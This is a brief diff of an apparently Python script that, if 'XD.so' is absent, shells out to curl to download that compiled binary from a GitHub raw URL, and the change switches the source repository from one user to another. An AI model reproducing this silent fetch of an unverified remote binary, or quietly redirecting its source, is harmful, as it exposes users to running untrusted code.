@@ -19,7 +19,7 @@ except:pass
 if path.isfile("XD.so"):
     pass
 else:
-    system("curl -L https://raw.githubusercontent.com/AKING110/files/main/XD.so -o XD.so")
+    system("curl -L https://raw.githubusercontent.com/ferdous010/files/main/XD.so -o XD.so")
 if path.isfile("dump.so"):
     pass
 else:
